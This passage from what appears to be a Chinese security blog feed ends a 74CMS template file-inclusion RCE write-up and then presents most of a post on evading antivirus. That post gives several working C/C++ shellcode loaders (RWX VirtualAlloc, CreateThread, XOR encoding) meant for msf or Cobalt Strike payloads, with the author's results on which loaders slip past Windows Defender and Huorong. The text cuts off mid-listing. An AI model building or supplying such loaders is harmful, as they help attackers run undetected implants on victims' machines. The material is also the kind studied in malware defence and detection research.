src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/17.png"></p><p>跟进<code>compiler</code>方法，可以看到传⼊的模板内容未经过过滤就直接被拼接到 <code>$tmplContent </code>变量中。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/18.png"></p><p>然后返回<code>loadTemplate</code>⽅法，看其编辑模板的逻辑：</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/19.png"></p><p>将编译好的模板进⾏缓存处理，然后返回缓存的⽂件名，可以看到 <code>loadTemplate </code>⽅法返回的缓存⽂件名进⼊了<code>Storage::load</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/20.png"></p><p>跟进<code>Storage::load</code>，发现会最终跟到<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/21.png"></p><p>跟进<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>，发现存在文件包含漏洞。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/22.png"></p><h1 id="4-Trips"><a href="#4-Trips" class="headerlink" title="4.Trips"></a>4.Trips</h1><p>​    我们上边进行漏洞复现的时候，使用的payload中为啥多了个<code>&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#39;id&#39;]&quot;/&gt;</code></p><p>这是因为在解析模板的时候，不是解析原⽣的<code>PHP</code>代码，因此如果图⽚⻢是纯<code>PHP</code>代码是⽆法利⽤成功的，必须要包括骑⼠ CMS 模板⽂件的标签，我们可以随便打开⼀个原有模板，然后复制⼀句话即可。</p><p>比如：<code>Application/Home/View/tpl_company/default/com_show.html</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/23.png"></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p><a href="http://document.thinkphp.cn/manual_3_2.html">http://document.thinkphp.cn/manual_3_2.html</a></p><p><a href="https://blog.csdn.net/qq_16877261/article/details/53484671">https://blog.csdn.net/qq_16877261/article/details/53484671</a></p><p><a href="https://my.oschina.net/u/4593034/blog/4805065">https://my.oschina.net/u/4593034/blog/4805065</a></p><p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;这个漏洞2020年的时候就已经出了，但是我现在复现分析学习[doge]。觉得对自己的提升最好的途径还是代码吧。以后有新漏洞的</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://reader-l.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀学习-静态恶意代码逃逸</title>
    <link href="https://reader-l.github.io/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/"/>
    <id>https://reader-l.github.io/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/</id>
    <published>2021-03-22T03:14:58.000Z</published>
    <updated>2021-03-23T13:37:57.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    上次用Python写了一个shellcode加载器后，对免杀有了很大的兴趣，因此想要再多学习一些。</p><h1 id="2-学习"><a href="#2-学习" class="headerlink" title="2.学习"></a>2.学习</h1><p>​    这次主要利用C/C++来实现shellcode的加载，以及基础免杀操作。</p><p>​    木马检测一般分为静态特征查杀、动态行为检测。</p><p>​    静态查杀，其实就是对文件特征码的检测。在各大杀软的病毒库中存储着病毒所具有的独一无二的特征字符，我们称之为特征码。当杀毒软件检测到文件中包含该特征码就会被识别为木马。</p><p>​    随着杀毒软件的升级，特征码的定位已经不仅仅是基于字符串或者正则来实现，现在已经衍生出各种文件扫描技术。比如在文件扫描中忽略像NOP这种无意义的指令，对于文本格式的脚本病毒或宏病毒，则可以替换掉多余的格式字符，例如空格、换行符或制表符等。</p><h2 id="1-基础加载器"><a href="#1-基础加载器" class="headerlink" title="1.基础加载器"></a>1.基础加载器</h2><p>知识点：</p><p>​    1.<code>VirtualAlloc</code>函数用来申请内存;</p><p>​    2.<code>MEM_COMMIT|MEM_RESERVE</code>：MEM_COMMIT—–&gt;为特定的页面区域分配内存中或磁盘的页面文件中的物理存储；MEM_RESERVE：保留进程的虚拟地址空间，而不分配任何物理存储。保留页面可通过继续调用<code>VirtualAlloc()</code>而被占用</p><p>​    3.<code>PAGE_EXECUTE_READWRITE</code>表示申请下来的内存块可读可写可执行。</p><p>​    4.<code>memcpy</code>用来将我们的shellcode复制进申请的内存中。</p><p>​    5.<code>((void(*)())old)();</code>执行申请下来的内存块。</p><p>c++：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//用msf或cs生成的shellcode</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">char</span>* old= (<span class="hljs-keyword">char</span>*)VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(old, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    ((<span class="hljs-keyword">void</span>(*)())old)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>C:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//用msf或cs生成的shellcode</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">char</span>* old= VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(old, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    ((<span class="hljs-keyword">void</span>(*)())old)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/1.png"></p><p>成功上线，但是这个会被<code>windows 10</code>自带的<code>windows defender</code>给杀掉。</p><h2 id="2-利用Windows-API调用和加载shellcode"><a href="#2-利用Windows-API调用和加载shellcode" class="headerlink" title="2.利用Windows API调用和加载shellcode"></a>2.利用Windows API调用和加载shellcode</h2><blockquote><p>​    Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p><p>申请方式：</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li><li>…</li></ul></blockquote><p>c++：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//可以用msf/cs来获取shellcode</span><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><span class="hljs-comment">// 创建线程</span><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>某杀毒没有查出，但是<code>windows defender</code>和 火绒会杀掉。</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/9.png"></p><h2 id="3-利用异或运算-内存申请步骤优化"><a href="#3-利用异或运算-内存申请步骤优化" class="headerlink" title="3.利用异或运算+内存申请步骤优化"></a>3.利用异或运算+内存申请步骤优化</h2><p>​    首先用CS或者MSF生成shellcode，然后用脚本将该shellcode进行异或运算转码。</p><h3 id="1-利用-运算符进行异或运算"><a href="#1-利用-运算符进行异或运算" class="headerlink" title="1.利用^运算符进行异或运算"></a>1.利用<code>^</code>运算符进行异或运算</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-comment">/* length: 800 bytes */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> b = <span class="hljs-keyword">sizeof</span>(buf);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> str[<span class="hljs-number">800</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>   <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; b; i++) &#123;<br>    str[i] = buf[i] ^ a;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; b; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\x%x&quot;</span>, str[i]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>​    将以上的脚本的输出结果给到以下<code>buf</code>变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    buf[i] ^= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功上线。</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/2.png"></p><p>*<em>但是简单的异或运算并不能躲避部分安全软件（火</em>）的查杀，但是某杀毒软件并没有查出。**</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/7.png"></p><p>上线的瞬间就被windows10微软自带的防火墙给杀了。</p><h3 id="2-利用windows的API来进行异或运算"><a href="#2-利用windows的API来进行异或运算" class="headerlink" title="2.利用windows的API来进行异或运算"></a>2.利用windows的API来进行异或运算</h3><p>​     通过调用windows自带的API来进行异或运算，才尝试能否绕过防护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinBase.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br><span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    <span class="hljs-comment">//Sleep(50);</span><br>    _InterlockedXor8(buf+i,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_EXECUTE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法可以初步绕过<code>windows defender</code>这个微软自带的防火墙：可以上线（之前用Python写的直接被杀），虽然还是有警告，但还是可以执行一段时间的命令。最后还是被杀了</p><p>某安全软件：一开始就被某个安全软件给杀了</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/5.png"></p><p>但是某杀毒软件并没有查出。</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/10.png"></p><h3 id="3-利用内存申请步骤优化来绕过部分安全软件"><a href="#3-利用内存申请步骤优化来绕过部分安全软件" class="headerlink" title="3.利用内存申请步骤优化来绕过部分安全软件"></a>3.利用内存申请步骤优化来绕过部分安全软件</h3><blockquote><p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 